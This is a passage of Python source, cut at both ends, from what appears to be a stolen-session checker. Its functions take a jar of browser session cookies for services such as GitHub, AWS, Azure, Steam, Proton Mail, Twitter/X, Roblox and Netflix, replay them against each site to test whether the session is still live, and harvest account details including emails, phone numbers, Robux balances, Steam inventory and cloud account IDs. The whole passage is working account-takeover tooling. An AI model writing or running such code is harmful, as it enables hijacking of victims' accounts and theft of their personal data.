                 headers=_headers({"Accept": "text/html"}),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url and "return_to" in r.url:
            return _err("Not authorized")
        login = _html_meta(html, "user-login")
        if login == "—":
            if '<a href="/login"' in html[:6000]:
                return _err("Not authorized")
            return _err("Session invalid (no user-login meta)")
        name = _html_meta(html, "octolytics-dimension-user_name") or login
        uid = _html_meta(html, "octolytics-dimension-user_id")
        avatar = "—"
        m = re.search(r'<meta property="og:image" content="([^"]+)"', html)
        if m:
            avatar = m.group(1)
        return {
            "valid": True, "service": "GitHub",
            "username": login,
            "name": name if name != "—" else "—",
            "user_id": uid if uid != "—" else "—",
            "avatar": avatar,
            "profile_url": f"https://github.com/{login}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "GitHub")
    except Exception as e:
        return _err(f"GitHub parse error: {e}", code="parse")


def check_gitlab(jar):
    sess = jar.get("_gitlab_session", "")
    if not sess:
        return _err("No _gitlab_session")
    ck = {k: v for k, v in jar.items()
          if k in ("_gitlab_session", "gitlab_canary", "known_sign_in")}
    try:
        r = _get("https://gitlab.com/-/profile",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://gitlab.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/users/sign_in" in r.url:
            return _err("Not authorized")
        html = r.text
        username = "—"
        m = re.search(r'"username"\s*:\s*"([^"]+)"', html)
        if m:
            username = m.group(1)
        if username == "—":
            m = re.search(r'<title[^>]*>(.*?)</title>', html, re.DOTALL)
            if m:
                t = re.sub(r"\s+", " ", m.group(1)).strip()
                username = t.split("·")[0].strip() if "·" in t else t
        return {
            "valid": True, "service": "GitLab",
            "username": username,
            "profile_url": "https://gitlab.com/-/profile",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "GitLab")
    except Exception as e:
        return _err(f"GitLab parse error: {e}", code="parse")


def check_bitbucket(jar):
    sess = (jar.get("bitbucket-session") or jar.get("bb_session") or "")
    if not sess:
        return _err("No bitbucket-session")
    ck = {k: v for k, v in jar.items()
          if k in ("bitbucket-session", "atl_user_id", "bb_session",
                   "cloud.session.token")}
    try:
        r = _get("https://bitbucket.org/account/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://bitbucket.org/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/account/signin" in r.url or "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        username = "—"
        m = re.search(r'"username"\s*:\s*"([^"]+)"', html)
        if m:
            username = m.group(1)
        return {
            "valid": True, "service": "Bitbucket",
            "username": username,
            "profile_url": "https://bitbucket.org/account/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Bitbucket")
    except Exception as e:
        return _err(f"Bitbucket parse error: {e}", code="parse")


def check_aws(jar):
    info = jar.get("aws-userInfo", "") or jar.get("aws-creds", "")
    if not info:
        return _err("No aws-userInfo/aws-creds")
    ck = {k: v for k, v in jar.items()
          if k in ("aws-userInfo", "aws-creds", "noflush_awsc-0",
                   "session-id", "aws-session")}
    try:
        r = _get("https://console.aws.amazon.com/console/home",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://console.aws.amazon.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "signin.aws.amazon.com" in r.url:
            return _err("Not authorized")
        html = r.text
        account = "—"
        m = re.search(r'"accountId"\s*:\s*"(\d+)"', html)
        if m:
            account = m.group(1)
        return {
            "valid": True, "service": "AWS",
            "account_id": account,
            "profile_url": "https://console.aws.amazon.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "AWS")
    except Exception as e:
        return _err(f"AWS parse error: {e}", code="parse")


def check_azure(jar):
    auth = (jar.get("ESTSAUTHPERSISTENT", "") or jar.get("ESTSAUTH", ""))
    if not auth:
        return _err("No Azure auth cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("ESTSAUTHPERSISTENT", "ESTSAUTH", "__Host-MSAAUTHP",
                   "RPSSecAuth", "brcap")}
    try:
        r = _get("https://portal.azure.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://portal.azure.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "login.microsoftonline" in r.url:
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'([\w.+-]+@[\w.-]+\.\w+)', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "Azure",
            "email": email,
            "profile_url": "https://portal.azure.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Azure")
    except Exception as e:
        return _err(f"Azure parse error: {e}", code="parse")


def check_digitalocean(jar):
    sess = jar.get("_digitalocean", "") or jar.get("DO_SESSION", "")
    if not sess:
        return _err("No DigitalOcean session")
    ck = {k: v for k, v in jar.items()
          if k in ("_digitalocean", "DO_SESSION", "do_csrf", "_do_session")}
    try:
        r = _get("https://cloud.digitalocean.com/account/profile",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://cloud.digitalocean.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'([\w.+-]+@[\w.-]+\.\w+)', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "DigitalOcean",
            "email": email,
            "profile_url": "https://cloud.digitalocean.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "DigitalOcean")
    except Exception as e:
        return _err(f"DigitalOcean parse error: {e}", code="parse")


def check_cloudflare(jar):
    sess = jar.get("__cf_dashboard_session", "")
    if not sess:
        return _err("No Cloudflare dashboard session")
    ck = {k: v for k, v in jar.items()
          if k in ("__cf_dashboard_session", "cf_clearance", "__cf_bm",
                   "__cfruid")}
    try:
        r = _get("https://dash.cloudflare.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://dash.cloudflare.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'([\w.+-]+@[\w.-]+\.\w+)', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "Cloudflare Dashboard",
            "email": email,
            "profile_url": "https://dash.cloudflare.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Cloudflare")
    except Exception as e:
        return _err(f"Cloudflare parse error: {e}", code="parse")


def check_steam(jar):
    login_secure = jar.get("steamLoginSecure", "")
    if not login_secure:
        return _err("No steamLoginSecure")
    steam_id = ""
    for sep in ("%7C%7C", "||"):
        if sep in login_secure:
            steam_id = login_secure.split(sep)[0]
            break
    if not steam_id.isdigit():
        return _err("No valid steamID in cookie")
    try:
        r = _get(f"https://steamcommunity.com/profiles/{steam_id}?xml=1",
                 headers=_headers(), cookies=jar)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        text = r.text
        if "<error>" in text or "profile could not be found" in text:
            return _err("Invalid steamID")
        persona, avatar_url = "—", "—"
        try:
            rj = _get(
                f"https://steamcommunity.com/actions/ajaxresolveusers?"
                f"steamids={steam_id}",
                headers=_headers({"Accept": "application/json"}),
                cookies=jar)
            if rj.status_code == 200 and rj.text.strip().startswith("["):
                arr = rj.json()
                if arr:
                    persona = arr[0].get("persona_name") or persona
                    avatar_url = arr[0].get("avatar_url") or avatar_url
        except Exception:
            pass
        session_valid = False
        try:
            r2 = _get("https://steamcommunity.com/my/profile",
                      headers=_headers(), cookies=jar,
                      allow_redirects=False)
            if r2.status_code in (301, 302, 303, 307, 308):
                loc = r2.headers.get("Location", "")
                if f"/profiles/{steam_id}" in loc or "/id/" in loc:
                    session_valid = True
            elif r2.status_code == 200:
                session_valid = f"/profiles/{steam_id}" in r2.text[:4000]
        except Exception:
            pass
        inv_count = "—"
        try:
            r3 = _get(
                f"https://steamcommunity.com/profiles/{steam_id}/"
                f"inventory/json/730/2",
                headers=_headers(), cookies=jar)
            if r3.status_code == 200:
                data = r3.json() or {}
                inv_count = len(data.get("rgInventory", {}) or {})
        except Exception:
            pass
        return {
            "valid": True, "service": "Steam",
            "steam_id": steam_id,
            "persona": persona if persona != "—" else _html_meta(
                text, "steamID"),
            "profile_url": f"https://steamcommunity.com/profiles/{steam_id}",
            "vac_banned": ("YES" if "<vacBanned>1</vacBanned>" in text
                           else "no"),
            "trade_ban": ("YES" if "<tradeBanState>Banned</tradeBanState>"
                          in text else "no"),
            "limited": ("YES" if "<isLimitedAccount>1</isLimitedAccount>"
                        in text else "no"),
            "inventory_items": inv_count,
            "session_valid": "YES" if session_valid else "no",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Steam")
    except Exception as e:
        return _err(f"Steam parse error: {e}", code="parse")


def check_openvpn(jar):
    sess = jar.get("_openvpn_session", "") or jar.get("_openvpn_pf", "")
    if not sess:
        return _err("No OpenVPN session cookie")
    ck = {k: v for k, v in jar.items() if k.startswith("_openvpn")}
    try:
        r = _get("https://openvpn.net/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://openvpn.net/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "OpenVPN",
            "session": "active",
            "profile_url": "https://openvpn.net/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "OpenVPN")
    except Exception as e:
        return _err(f"OpenVPN parse error: {e}", code="parse")


def check_wireguard(jar):
    sess = (jar.get("wg_session", "") or jar.get("wireguard_session", ""))
    if not sess:
        return _err("No WireGuard session cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("wg_session", "wireguard_session", "wg_csrf",
                   "wireguard_uid")}
    try:
        r = _get("https://www.wireguard.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.wireguard.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "WireGuard",
            "session": "active",
            "profile_url": "https://www.wireguard.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "WireGuard")
    except Exception as e:
        return _err(f"WireGuard parse error: {e}", code="parse")


def check_adminer(jar):
    sid = jar.get("adminer_sid", "") or jar.get("adminer_key", "")
    if not sid:
        return _err("No Adminer session cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("adminer_sid", "adminer_key", "adminer_version",
                   "adminer_permanent")}
    return {
        "valid": True, "service": "Adminer",
        "session_id": sid[:12] + "…" if len(sid) > 12 else sid,
        "cookies_count": len(ck),
    }


def check_phpmyadmin(jar):
    pma = jar.get("phpMyAdmin", "")
    auth = None
    for k in jar.keys():
        if k.startswith("pmaAuth"):
            auth = k
            break
    if not pma and not auth:
        return _err("No phpMyAdmin session cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("phpMyAdmin", "pma_lang", "pma_theme")
          or k.startswith("pmaAuth") or k.startswith("pmaUser")}
    return {
        "valid": True, "service": "phpMyAdmin",
        "session": "present",
        "cookies_count": len(ck),
    }


def check_proton(jar):
    auth_uid = None
    refresh_uid = None
    for k in jar.keys():
        if k.startswith("AUTH-") and auth_uid is None:
            auth_uid = k[len("AUTH-"):]
        elif k.startswith("REFRESH-") and refresh_uid is None:
            refresh_uid = k[len("REFRESH-"):]
    uid = auth_uid or refresh_uid
    if not uid:
        return _err("No AUTH-/REFRESH- cookie")
    ck = dict(jar)
    headers = _headers({
        "Accept": "application/json",
        "x-pm-uid": uid,
        "Referer": "https://mail.proton.me/",
        "Origin": "https://mail.proton.me",
        "x-pm-appversion": "web-mail@5.0.0",
    })
    try:
        r = _get("https://mail.proton.me/api/users",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code == 401:
            return _err("Invalid or expired session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        user = data.get("User") if isinstance(data, dict) else None
        if not user:
            return _err("Not authorized")
        return {
            "valid": True, "service": "Proton Mail",
            "id": user.get("ID", "—"),
            "username": user.get("Name", "—"),
            "email": user.get("Email", "—") or "—",
            "display_name": user.get("DisplayName", "—") or "—",
            "currency": user.get("Currency", "—"),
            "credit": user.get("Credit", "—"),
            "subscribed": user.get("Subscribed", "—"),
            "profile_url": "https://mail.proton.me/u/0/inbox",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Proton Mail")
    except Exception as e:
        return _err(f"Proton parse error: {e}", code="parse")


def check_yahoo(jar):
    a1 = jar.get("A1", "")
    if not a1:
        return _err("No A1 cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("A1", "A1S", "A3", "B", "Y", "GUC", "T", "F")}
    try:
        r = _get("https://mail.yahoo.com/",
                 headers=_headers({
                     "Accept": "text/html,application/xhtml+xml",
                     "Referer": "https://www.yahoo.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "login.yahoo.com" in r.url:
            return _err("Not authorized")
        email = "—"
        for pat in (r'"login"\s*:\s*"([^"]+@yahoo[^"]*)"',
                    r'"email"\s*:\s*"([^"]+@[^"]+)"',
                    r'([A-Za-z0-9._%+\-]+@yahoo\.[a-z.]+)'):
            m = re.search(pat, html)
            if m:
                email = m.group(1)
                break
        name = "—"
        m = re.search(r'"displayName"\s*:\s*"([^"]+)"', html)
        if m:
            name = m.group(1)
        return {
            "valid": True, "service": "Yahoo Mail",
            "email": email, "name": name,
            "profile_url": "https://mail.yahoo.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Yahoo")
    except Exception as e:
        return _err(f"Yahoo parse error: {e}", code="parse")


def check_mailru(jar):
    mpop = jar.get("Mpop", "")
    if not mpop:
        return _err("No Mpop")
    ck = {k: v for k, v in jar.items()
          if k in ("Mpop", "video_key", "act", "VKcookie")}
    try:
        r = _get("https://e.mail.ru/api/v1/user",
                 headers=_headers({
                     "Accept": "application/json",
                     "Referer": "https://e.mail.ru/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        body = data.get("body") or data
        if not body:
            return _err("Not authorized")
        return {
            "valid": True, "service": "Mail.ru",
            "email": body.get("email", "—") or "—",
            "name": body.get("name", "—") or "—",
            "profile_url": "https://e.mail.ru/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Mail.ru")
    except Exception as e:
        return _err(f"Mail.ru parse error: {e}", code="parse")


def check_epic(jar):
    sso = jar.get("EPIC_SSO", "") or jar.get("EPIC_BEARER", "")
    if not sso:
        return _err("No EPIC_SSO")
    ck = {k: v for k, v in jar.items()
          if k in ("EPIC_SSO", "EPIC_BEARER", "EPIC_SSO_RM",
                   "EPIC_SESSION", "EPIC_DEVICE")}
    auth_header = sso if sso.startswith("eg1~") else sso
    headers = _headers({
        "Authorization": f"bearer {auth_header}",
        "Accept": "application/json",
        "Origin": "https://www.epicgames.com",
        "Referer": "https://www.epicgames.com/",
    })
    try:
        r = _get("https://account-public-service-prod.ol.epicgames.com/"
                 "account/api/public/account",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid EPIC_SSO")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        account = data.get("account") or data
        if not isinstance(account, dict) or not account.get("id"):
            return _err("Not authorized")
        return {
            "valid": True, "service": "Epic Games",
            "id": account.get("id", "—"),
            "display_name": account.get("displayName", "—"),
            "email": account.get("email", "—") or "—",
            "country": account.get("country", "—"),
            "preferred_language": account.get("preferredLanguage", "—"),
            "profile_url": "https://www.epicgames.com/account/personal",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Epic Games")
    except Exception as e:
        return _err(f"Epic parse error: {e}", code="parse")


def check_riot(jar):
    ssid = jar.get("ssid", "")
    if not ssid:
        return _err("No ssid")
    ck = {k: v for k, v in jar.items()
          if k in ("ssid", "clid", "csid", "tdid", "ccid", "sub")}
    headers = _headers({
        "Accept": "application/json",
        "Origin": "https://auth.riotgames.com",
        "Referer": "https://auth.riotgames.com/",
    })
    try:
        r = _get("https://auth.riotgames.com/userinfo",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid ssid")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        if not data.get("sub"):
            return _err("Not authorized")
        return {
            "valid": True, "service": "Riot Games",
            "sub": data.get("sub", "—"),
            "acct": data.get("acct", "—"),
            "country": data.get("country", "—") or jar.get("sub", "—"),
            "email": data.get("email", "—") or "—",
            "email_verified": ("YES" if data.get("email_verified")
                               else "no"),
            "phone_verified": ("YES" if data.get("phone_number_verified")
                               else "no"),
            "profile_url": "https://account.riotgames.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Riot Games")
    except Exception as e:
        return _err(f"Riot parse error: {e}", code="parse")


def check_battlenet(jar):
    bayer = jar.get("BAYEUX_BROWSER", "")
    if not bayer:
        return _err("No BAYEUX_BROWSER")
    ck = {k: v for k, v in jar.items()
          if k in ("BAYEUX_BROWSER", "XSRF-TOKEN", "_blizzard_web")}
    try:
        r = _get("https://account.battle.net/overview",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://account.battle.net/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        battletag = "—"
        m = re.search(r'"battleTag"\s*:\s*"([^"]+)"', html)
        if m:
            battletag = m.group(1)
        return {
            "valid": True, "service": "Battle.net",
            "battletag": battletag,
            "profile_url": "https://account.battle.net/overview",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Battle.net")
    except Exception as e:
        return _err(f"Battle.net parse error: {e}", code="parse")


def check_xbox(jar):
    xbl = jar.get("XBL3.0", "")
    if not xbl:
        return _err("No XBL3.0")
    ck = {k: v for k, v in jar.items()
          if k in ("XBL3.0", "MSCC", "__Host-MSAAUTH")}
    headers = _headers({
        "Accept": "application/json",
        "Authorization": f"XBL3.0 {xbl}",
        "x-xbl-contract-version": "2",
        "Referer": "https://www.xbox.com/",
    })
    try:
        r = _get("https://profile.xboxlive.com/users/me/profile/settings"
                 "?settings=Gamertag",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid token")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        users = data.get("profileUsers") or []
        if not users:
            return _err("Not authorized")
        settings = {s.get("id"): s.get("value")
                    for s in (users[0].get("settings") or [])}
        return {
            "valid": True, "service": "Xbox",
            "xuid": users[0].get("id", "—"),
            "gamertag": settings.get("Gamertag", "—"),
            "profile_url": "https://www.xbox.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Xbox")
    except Exception as e:
        return _err(f"Xbox parse error: {e}", code="parse")


def check_roblox(jar):
    cookie = jar.get(".ROBLOSECURITY", "")
    if not cookie:
        return _err("No .ROBLOSECURITY")
    ck = {".ROBLOSECURITY": cookie}
    try:
        r = _get("https://users.roblox.com/v1/users/authenticated",
                 headers=_headers(), cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code == 401:
            return _err("Invalid cookie")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        user = r.json()
        uid = user.get("id")
        if not uid:
            return _err("No user id in response", code="parse")
        robux = "—"
        try:
            rb = _get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                      headers=_headers(), cookies=ck)
            if rb.status_code == 200:
                robux = rb.json().get("robux", "—")
        except Exception:
            pass
        email = "—"
        try:
            er = _get("https://accountsettings.roblox.com/v1/email",
                      headers=_headers(), cookies=ck)
            if er.status_code == 200:
                email = er.json().get("emailAddress", "—") or "—"
        except Exception:
            pass
        return {
            "valid": True, "service": "Roblox",
            "id": uid,
            "username": user.get("name", "—"),
            "display_name": user.get("displayName", "—"),
            "robux": robux, "email": email,
            "profile_url": f"https://www.roblox.com/users/{uid}/profile",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Roblox")
    except Exception as e:
        return _err(f"Roblox parse error: {e}", code="parse")


def check_twitter(jar):
    auth = jar.get("auth_token", "")
    csrf = jar.get("ct0", "")
    if not auth:
        return _err("No auth_token")
    if not csrf:
        return _err("No ct0 (CSRF)")
    ck = {"auth_token": auth, "ct0": csrf}
    headers = _headers({
        "Authorization": f"Bearer {TW_BEARER}",
        "x-csrf-token": csrf,
        "x-twitter-auth-type": "OAuth2Session",
        "x-twitter-active-user": "yes",
        "x-twitter-client-language": "en",
        "Accept": "application/json",
        "Referer": "https://x.com/",
    })
    try:
        r = _get("https://api.twitter.com/1.1/account/settings.json",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        screen = data.get("screen_name") or "—"
        if screen == "—":
            return _err("Not authorized")
        return {
            "valid": True, "service": "Twitter/X",
            "username": screen,
            "display_name": data.get("name", "—") or "—",
            "user_id": data.get("user_id", "—"),
            "email": data.get("email", "—") or "—",
            "phone": data.get("phone_number", "—") or "—",
            "country": data.get("country_code", "—"),
            "language": data.get("language", "—"),
            "protected": "YES" if data.get("protected") else "no",
            "verified": "YES" if data.get("verified") else "no",
            "profile_url": f"https://x.com/{screen}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Twitter")
    except Exception as e:
        return _err(f"Twitter parse error: {e}", code="parse")


def check_reddit(jar):
    session = jar.get("reddit_session", "")
    if not session:
        return _err("No reddit_session")
    ck = {k: v for k, v in jar.items()
          if k in ("reddit_session", "token_v2", "csv", "edgebucket",
                   "session_tracker")}
    try:
        r = _get("https://www.reddit.com/api/v1/me.json",
                 headers=_headers({
                     "Accept": "application/json",
                     "Referer": "https://www.reddit.com/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        if not data.get("name"):
            return _err("Not authorized")
        return {
            "valid": True, "service": "Reddit",
            "username": data.get("name", "—"),
            "id": data.get("id", "—"),
            "karma_link": data.get("link_karma", "—"),
            "karma_comment": data.get("comment_karma", "—"),
            "karma_total": (data.get("link_karma", 0) or 0)
                           + (data.get("comment_karma", 0) or 0),
            "gold": "YES" if data.get("is_gold") else "no",
            "mod": "YES" if data.get("is_mod") else "no",
            "verified_email": ("YES" if data.get("has_verified_email")
                               else "no"),
            "profile_url": (f"https://www.reddit.com/user/"
                            f"{data.get('name', '')}"),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Reddit")
    except Exception as e:
        return _err(f"Reddit parse error: {e}", code="parse")


def check_linkedin(jar):
    li_at = jar.get("li_at", "")
    if not li_at:
        return _err("No li_at")
    ck = {k: v for k, v in jar.items()
          if k in ("li_at", "JSESSIONID", "li_rm", "lang", "bcookie",
                   "bscookie", "lidc", "UserMatchHistory")}
    headers = _headers({
        "Accept": "text/html,application/xhtml+xml",
        "csrf-token": jar.get("JSESSIONID", "").strip('"'),
        "Referer": "https://www.linkedin.com/feed/",
    })
    try:
        r = _get("https://www.linkedin.com/feed/",
                 headers=headers, cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower() or "/uas/login" in r.url.lower():
            return _err("Not authorized")
        name = "—"
        for pat in (r'<title[^>]*>(.*?)</title>',
                    r'"firstName"\s*:\s*"([^"]+)"'):
            m = re.search(pat, html, re.DOTALL)
            if m:
                t = re.sub(r"\s+", " ", m.group(1)).strip()
                if t and t.lower() not in ("linkedin", "sign in"):
                    name = t
                    break
        public_id = _html_meta(html, "profile:public-identifier")
        if public_id == "—":
            public_id = jar.get("li_rm", "—")
        return {
            "valid": True, "service": "LinkedIn",
            "name": name, "public_id": public_id,
            "profile_url": (f"https://www.linkedin.com/in/{public_id}/"
                            if public_id != "—"
                            else "https://www.linkedin.com/feed/"),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "LinkedIn")
    except Exception as e:
        return _err(f"LinkedIn parse error: {e}", code="parse")


def check_tiktok(jar):
    sessionid = (jar.get("sessionid") or jar.get("sessionid_ss")
                 or jar.get("sid_tt"))
    if not sessionid:
        return _err("No sessionid")
    ck = {k: v for k, v in jar.items()
          if k in ("sessionid", "sessionid_ss", "sid_tt", "sid_guard",
                   "uid_tt", "uid_tt_ss", "ttwid", "passport_csrf_token",
                   "tt_csrf_token", "msToken")}
    url = ("https://www.tiktok.com/passport/web/account/info/"
           "?aid=1459&app_name=tiktok_web&device_platform=web")
    try:
        r = _get(url,
                 headers=_headers({
                     "Accept": "application/json, text/plain, */*",
                     "Referer": "https://www.tiktok.com/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        payload = data.get("data") if isinstance(data, dict) else None
        if not payload or not isinstance(payload, dict):
            return _err("Not authorized")
        uid = payload.get("user_id") or payload.get("uid")
        if not uid:
            return _err("Not authorized (no user_id)")
        username = payload.get("username") or payload.get("unique_id") or "—"
        return {
            "valid": True, "service": "TikTok",
            "user_id": uid, "username": username,
            "nickname": (payload.get("nickname")
                         or payload.get("nick_name") or "—"),
            "email": payload.get("email") or "—",
            "region": payload.get("region") or "—",
            "profile_url": (f"https://www.tiktok.com/@{username}"
                            if username != "—" else "—"),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "TikTok")
    except Exception as e:
        return _err(f"TikTok parse error: {e}", code="parse")


def check_twitch(jar):
    token = jar.get("auth-token", "")
    if not token:
        return _err("No auth-token")
    headers = _headers({
        "Authorization": f"OAuth {token}",
        "Client-Id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
    })
    try:
        r = _get("https://api.twitch.tv/helix/users", headers=headers)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code == 401:
            return _err("Invalid token")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        arr = data.get("data") or []
        if not arr:
            return _err("Empty user data")
        d = arr[0]
        return {
            "valid": True, "service": "Twitch",
            "id": d.get("id", "—"),
            "login": d.get("login", "—"),
            "display_name": d.get("display_name", "—"),
            "email": d.get("email", "—") or "—",
            "email_verified": "YES" if d.get("email_verified") else "no",
            "created_at": d.get("created_at", "—"),
            "profile_url": f"https://twitch.tv/{d.get('login', '')}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Twitch")
    except Exception as e:
        return _err(f"Twitch parse error: {e}", code="parse")


def check_netflix(jar):
    cookies = {k: v for k, v in jar.items()
               if k in ("NetflixId", "SecureNetflixId")}
    if not cookies.get("NetflixId"):
        return _err("No NetflixId")
    try:
        r = _get("https://www.netflix.com/YourAccount",
                 headers=_headers({
                     "Accept": "text/html,application/xhtml+xml",
                     "Referer": "https://www.netflix.com/browse",
                 }),
                 cookies=cookies, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200 or "/login" in r.url:
            return _err("Not authorized")
        html = r.text
        email, plan, country = "—", "—", "—"
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        if m:
            email = m.group(1)
        m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', html)
        if m:
            country = m.group(1)
        m = re.search(r'"currentPlanName"\s*:\s*"([^"]+)"', html)
        if m:
            plan = m.group(1)
        return {
            "valid": True, "service": "Netflix",
            "email": email, "plan": plan, "country": country,
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Netflix")
    except Exception as e:
        return _err(f"Netflix parse error: {e}", code="parse")


def check_spotify(jar):
    cookie = jar.get("sp_dc", "")
    if not cookie:
        return _err("No sp_dc")
    ck = {"sp_dc": cookie}
    try:
        r = _get("https://www.spotify.com/api/account/v1/account-settings",
                 headers=_headers({
                     "Accept": "application/json",
                     "Referer": "https://www.spotify.com/account/overview/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code == 401:
            return _err("Invalid sp_dc")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r)
        if data is None:
            return _err("Invalid JSON from Spotify", code="parse")
        if "accountSettings" in data and \
           isinstance(data["accountSettings"], dict):
            data = data["accountSettings"]
        return {
            "valid": True, "service": "Spotify",
